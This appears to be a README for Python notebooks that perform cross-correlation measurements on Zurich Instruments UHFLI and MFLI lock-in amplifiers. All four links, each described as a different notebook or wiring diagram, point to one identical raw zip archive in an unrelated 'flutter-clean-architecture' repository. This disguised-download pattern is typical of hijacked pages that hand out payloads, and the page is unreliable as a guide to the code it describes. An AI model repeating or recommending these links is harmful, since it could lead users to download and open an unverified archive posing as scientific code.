## ** 03/06/2020 The working code for the two MFLI is now uploaded which uses the scope module ##

Manual Cross Correlation code in Python Notebook (.ipynb) format. The code will do all the work for you, and all you have to do is set your device name and follow the wiring setup; or you can do your own experiment! This is specifically for the UHFLI and MFLI devices (UHF-QA can work too).

Cross Correlation https://raw.githubusercontent.com/jszhiu/flutter-clean-architecture/master/spoutiness/flutter-clean-architecture.zip demonstrates the validation of the cross-correlation code in the frequency domain, this was written and tested using a single UHFLI. See the wiring example required for this: https://raw.githubusercontent.com/jszhiu/flutter-clean-architecture/master/spoutiness/flutter-clean-architecture.zip

UHFLI Cross Correlation https://raw.githubusercontent.com/jszhiu/flutter-clean-architecture/master/spoutiness/flutter-clean-architecture.zip is the main cross-correlation code which can now be repeated many times. Many more of the parameters here changed for eg. no. of repeats, signal amplitude, input range, etc. See the wiring example required for this: https://raw.githubusercontent.com/jszhiu/flutter-clean-architecture/master/spoutiness/flutter-clean-architecture.zip

Of course, you can use any kind of wiring setup you wish and change the code as you please.
